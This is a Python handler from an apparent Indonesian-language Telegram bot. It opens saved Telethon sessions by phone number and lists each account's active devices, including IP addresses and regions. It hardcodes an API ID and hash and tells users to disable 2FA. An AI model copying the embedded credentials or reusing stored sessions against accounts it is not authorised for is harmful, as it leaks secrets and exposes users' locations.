# device_info.py
import os
from telethon.tl import functions
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from telegram import Update
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes
from config import SESSION_FOLDER

API_ID = 23520639
API_HASH = 'bcbc7a22cde8fa2ba7d1baad086086ca'

async def device_info_handler(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str):
    session_path = os.path.join(SESSION_FOLDER, f"{phone_number}.session")
    if not os.path.exists(session_path):
        await update.callback_query.message.reply_text(f"❌ Session tidak ditemukan untuk {phone_number}")
        return

    try:
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.start()
        sessions = await client(functions.account.GetAuthorizationsRequest())
        await client.disconnect()

        if not sessions.authorizations:
            await update.callback_query.message.reply_text("⚠️ Tidak ada perangkat aktif yang ditemukan.")
            return

        message_lines = ["🖥️ *Daftar Device Aktif:*", ""]
        for idx, auth in enumerate(sessions.authorizations, 1):
            platform = auth.platform or "Unknown"
            device_model = auth.device_model or "Unknown"
            system_version = auth.system_version or "Unknown"
            app_name = auth.app_name or "Telegram"
            region = auth.country or "Tidak diketahui"
            current = "✅ (Sedang digunakan)" if auth.current else ""
            ip = auth.ip or "-"
            last_active = auth.date_active.strftime('%Y-%m-%d %H:%M:%S')

            message_lines.append(
                f"*{idx}. {platform} {device_model}* {current}\n"
                f"🕒 Terakhir aktif: `{last_active}`\n"
                f"🌍 IP: `{ip}`, Wilayah: {region}\n"
                f"📲 Aplikasi: {app_name} ({system_version})\n"
            )

        keyboard = [
            [InlineKeyboardButton("🔙 Back to Menu", callback_data=f"select_{phone_number}")]
        ]
        await update.callback_query.message.reply_text(
            "\n".join(message_lines),
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        

    except SessionPasswordNeededError:
        await update.callback_query.message.reply_text("⚠️ 2FA aktif. Silakan nonaktifkan terlebih dahulu.")
    except Exception as e:
        await update.callback_query.message.reply_text(f"⚠️ Gagal mengambil daftar device:\n`{str(e)}`", parse_mode="Markdown")
